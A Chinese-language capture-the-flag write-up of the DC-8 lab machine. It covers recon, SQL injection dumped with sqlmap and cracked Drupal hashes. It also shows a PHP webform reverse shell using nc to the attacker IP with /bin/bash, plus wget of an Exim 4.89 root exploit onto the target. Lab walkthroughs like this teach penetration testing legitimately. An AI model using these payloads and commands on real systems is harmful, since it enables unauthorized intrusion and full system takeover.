---
layout: post
title: DC-8
subtitle: DC-8
date: 2023-07-17 09:13
author: Kyon-H
header-img: img/post-bg-2015.jpg
tags:
  - 靶场实战
  - DC系列
published: true
number headings: first-level 2, max 4, 1.1., auto
---

## 1. 信息搜集

扫描 IP，发现主机 `192.168.163.131`

![image.png](https://img.ghostliner.top/WUE7BR.png)

扫描端口发现 80 和 22 端口

```shell
nmap -T4 -A -p- 192.168.163.131
```

![image.png](https://img.ghostliner.top/YDtSmm.png)

目录扫描发现登录地址 `/user/login/`

```shell
dirsearch -u http://192.168.163.131 -e* -i 200
```

![image.png](https://img.ghostliner.top/3yhHXh.png)

指纹识别，发现站点为 `Drupal 7`

```shell
whatweb -v http://192.168.163.131
```

![image.png](https://img.ghostliner.top/Ut8ZAj.png)

浏览器查看站点地址： <http://192.168.163.131/?nid=1>

`nid=1'` 测试发现存在 sql 注入

![image.png](https://img.ghostliner.top/pJ82cf.png)

## 2. 渗透测试

#### 2.1.1. 数据库爆破

sqlmap 爆破数据库，获取用户名密码

```shell
# 获取当前数据库
sqlmap -u http://192.168.163.131/?nid=1 --current-db --batch
# 获取数据库表
sqlmap -u http://192.168.163.131/?nid=1 -D d7db --tables
# 获取表中列
sqlmap -u http://192.168.163.131/?nid=1 -D d7db -T users --columns
# 获取用户名，密码
sqlmap -u http://192.168.163.131/?nid=1 -D d7db -T users -C name,pass --dump
```

数据库名：`d7db`
![image.png](https://img.ghostliner.top/c6ezx6.png)

数据库中 users 表的列名，发现其中有 `name`, `pass`
![image.png](https://img.ghostliner.top/V508yv.png)

获取到用户名、密码
![image.png](https://img.ghostliner.top/2Ox8LF.png)

`$S`为`Drupal`的密码哈希加密格式，尝试用 `john` 破解

```shell
echo '$S$D2tRcYRyqVFNSc0NvYUrYeQbLQg5koMKtihYTIDC9QQqJi3ICg5z' > john.txt
echo '$S$DqupvJbxVmqjr6cYePnx2A891ln7lsuku/3if/oRVZJaz5mKC2vF' >> john.txt
john john.txt
# turtle
```

#### 2.1.2. 反弹 shell

使用用户名：john，密码：turtle 登录成功，浏览网站

在此页面发现可以注入 PHP 代码： <http://192.168.163.131/node/3#overlay-context=user/2&overlay=node/3/webform/configure>

添加反弹 shell 代码

```php
<?php exec('nc -nv 192.168.163.132 4444 -c /bin/bash');?>
```

![image.png](https://img.ghostliner.top/J24lVZ.png)

kali 开启监听，浏览器访问`Contact Us` 页面，提交内容后，kali 成功连接到 shell

![image.png](https://img.ghostliner.top/WdaAm9.png)

#### 2.1.3. 提权

`sudo -l` 提权失败，尝试 find 提权

```shell
find / -user root -perm -4000 -type f 2> /dev/null
```

发现 `/usr/sbin/exim4`

![image.png](https://img.ghostliner.top/gm1yev.png)

查看`exim4`版本为：4.89

![image.png](https://img.ghostliner.top/jwMu1W.png)

搜索相关漏洞

```shell
searchexploit exim
```

![image.png](https://img.ghostliner.top/ppHChf.png)

使用 `46996.sh`脚本，将其传输到目标机

```shell
# 复制到当前目录
searchexploit -m 46996
```

查看内容，发现两种使用方法

方法 1：`-m setuid`
![image.png](https://img.ghostliner.top/CQexEH.png)

方法 2：`-m netcat`
![image.png](https://img.ghostliner.top/qEb0I1.png)

将 `46996.sh`传输到目标机

```shell
# 开启http服务
python -m http.server 8000
# 目标机获取脚本
wget http://192.168.163.132:8000/46996.sh
# 添加执行权限
chmod +x 46996.sh
# 提权方法1
./46996.sh -m setuid
# 提权方法2
./46996.sh -m netcat
```

方法 1 提权失败
![image.png](https://img.ghostliner.top/8zuEL4.png)

方法 2 提权成功
![image.png](https://img.ghostliner.top/Ko5DKw.png)

#### 2.1.4. 获取 flag

root 目录下获取到 flag 文件
![image.png](https://img.ghostliner.top/cNlIz1.png)
